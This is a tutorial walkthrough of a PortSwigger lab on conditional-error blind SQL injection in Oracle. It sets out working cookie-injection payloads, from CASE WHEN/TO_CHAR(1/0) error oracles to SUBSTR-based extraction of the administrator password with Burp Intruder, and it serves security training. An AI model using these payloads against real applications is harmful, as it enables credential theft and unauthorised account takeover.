This is the **PortSwigger Blind SQL Injection with Conditional Errors** lab using an **Oracle database**. The key idea is different from the previous Boolean-response lab: here, you infer whether a condition is true by deliberately causing a database error.

## Objective

The objective of this lab is to **identify and exploit a blind SQL injection vulnerability in an Oracle database using conditional errors**. You will use Burp Suite to:

1. Confirm that the `TrackingId` cookie is vulnerable to SQL injection.
2. Determine that the backend database is **Oracle**.
3. Verify the existence of the `users` table and the `administrator` account.
4. Use conditional SQL errors to determine the **length of the administrator's password**.
5. Use **Burp Intruder** and the `SUBSTR()` function to determine the password **one character at a time**.
6. Reconstruct the complete administrator password and use it to log in to the application.


# 1. Confirm the injection point

Start with:

```http
TrackingId=xyz'
```

If you receive an error, the added `'` has probably made the SQL syntax invalid.

Now try:

```http
TrackingId=xyz''
```

If the error disappears, the second quote has effectively balanced the quote introduced by the first one.

This establishes a useful **error/no-error signal**.

---

# 2. Confirm that the error is SQL-related

Try:

```sql
xyz'||(SELECT '')||'
```

If this produces an error, the syntax may not match the target database.

Because Oracle requires a `FROM` clause for this kind of `SELECT`, try:

```sql
xyz'||(SELECT '' FROM dual)||'
```

If the error disappears, that is strong evidence that the backend is **Oracle**.

### Why `dual`?

Oracle provides a special one-row table called `DUAL`.

So:

```sql
SELECT '' FROM dual
```

is a valid way to select a constant without needing an ordinary application table.

---

# 3. Confirm that the query is actually being executed

Try a table that shouldn't exist:

```sql
xyz'||(SELECT '' FROM not-a-real-table)||'
```

You should receive an error.

Compare:

```text
SELECT '' FROM dual
        ↓
      valid
        ↓
   no error
```

with:

```text
SELECT '' FROM not-a-real-table
        ↓
     invalid
        ↓
      error
```

This strongly indicates that your injected expression is being processed by the SQL database.

---

# 4. Check whether the `users` table exists

Use:

```sql
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

If there is no error, you can infer that the `users` table exists.

### Why `ROWNUM = 1`?

The subquery is being used as part of an expression.

If it returned multiple rows, the expression could fail because a single value is expected.

Therefore:

```sql
WHERE ROWNUM = 1
```

limits the result to one row.

---

# 5. Create a conditional error

This is the central technique of the lab.

Use:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Because:

```sql
1=1
```

is TRUE, Oracle evaluates:

```sql
TO_CHAR(1/0)
```

which causes a division-by-zero error.

Therefore:

**TRUE → HTTP error**

Now change the condition:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Here:

```text
1=2 → FALSE
```

so Oracle evaluates:

```sql
''
```

instead of the division by zero.

Therefore:

**FALSE → no error**

You've now created a **Boolean-to-error oracle**:

```text
Condition TRUE
      ↓
intentional SQL error
      ↓
HTTP 500

Condition FALSE
      ↓
normal SQL execution
      ↓
HTTP 200
```

---

# 6. Check whether `administrator` exists

Now replace the test condition with a query against `users`:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

If an error occurs, the query found the administrator row.

The important point is that the error itself doesn't tell you the username. Instead, it tells you that your **condition was satisfied**.

---

# 7. Determine the password length

Use `LENGTH(password)`.

For example:

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

If an error occurs:

```text
LENGTH(password) > 1
```

is true.

Then test:

```text
>2
>3
>4
...
```

For example:

```sql
LENGTH(password)>10
```

If that produces an error, the password is longer than 10 characters.

Eventually you reach a point where the error disappears.

For this lab:

```text
LENGTH(password) = 20
```

---

# 8. Extract the password character by character

Now you know:

```text
Password length = 20
```

The next question is:

> "What is the character at position 1?"

Use:

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

`SUBSTR(password,1,1)` means:

```text
password
   │
   └── start at character 1
       take 1 character
```

If the first character is `a`:

```text
'a' = 'a'
     ↓
TRUE
     ↓
1/0
     ↓
HTTP 500
```

If it isn't `a`:

```text
'a' ≠ actual character
       ↓
FALSE
       ↓
''
       ↓
HTTP 200
```

---

# 9. Automate character testing with Burp Intruder

Send the request to **Intruder**.

The relevant portion should look like:

```sql
SUBSTR(password,1,1)='§a§'
```

The `§` markers indicate the payload position.

Configure a **Simple list** containing:

```text
a-z
0-9
```

The lab's password is assumed to contain only lowercase alphanumeric characters.

Launch the attack.

---

# 10. Identify the correct character

The important distinction in this lab is the HTTP status code:

| Guess             | Result   |
| ----------------- | -------- |
| Wrong character   | HTTP 200 |
| Correct character | HTTP 500 |

So look at the **Status** column in Intruder.

For example:

| Payload |  Status |
| ------- | ------: |
| a       |     200 |
| b       |     200 |
| c       |     200 |
| ...     |     ... |
| m       | **500** |
| n       |     200 |

Then:

```text
Position 1 = m
```

The exact character will depend on your lab instance.

---

# 11. Repeat for positions 2–20

Change:

```sql
SUBSTR(password,1,1)
```

to:

```sql
SUBSTR(password,2,1)
```

Then:

```sql
SUBSTR(password,3,1)
```

and so on.

Conceptually:

```text
SUBSTR(password,1,1) → character 1
SUBSTR(password,2,1) → character 2
SUBSTR(password,3,1) → character 3
...
SUBSTR(password,20,1) → character 20
```

For each position, run the same Intruder attack and find the payload that produces **HTTP 500**.

Eventually:

```text
Position 1 → ?
Position 2 → ?
Position 3 → ?
...
Position 20 → ?
```

Putting those characters together gives the administrator password.

---

# Why `CASE` is so important

The key expression is:

```sql
CASE
    WHEN condition
    THEN TO_CHAR(1/0)
    ELSE ''
END
```

It effectively converts a database condition into an observable response:

```text
             Condition
                 │
          ┌──────┴──────┐
        TRUE           FALSE
          │               │
        1/0              ''
          │               │
       ERROR           No error
          │               │
       HTTP 500        HTTP 200
```

That is why this technique is called **conditional-error blind SQL injection**.

---

## Complete methodology

```text
Find injection point
        ↓
Confirm Oracle
        ↓
Confirm users table
        ↓
Create TRUE → error
FALSE → no error
        ↓
Confirm administrator
        ↓
Determine password length
        ↓
SUBSTR(password,1,1)
        ↓
Burp Intruder
        ↓
Test a-z + 0-9
        ↓
HTTP 500 = correct character
        ↓
Repeat positions 1–20
        ↓
Reconstruct password
        ↓
Log in as administrator
```

### The main concept to remember

In ordinary blind SQL injection, you might use **different page content** to distinguish TRUE from FALSE. In this Oracle lab, you deliberately create an error when the condition is true. Therefore:

**HTTP 500 = your tested condition is TRUE**
**HTTP 200 = your tested condition is FALSE**

That single observation lets you progressively determine the password without the database ever directly displaying it.
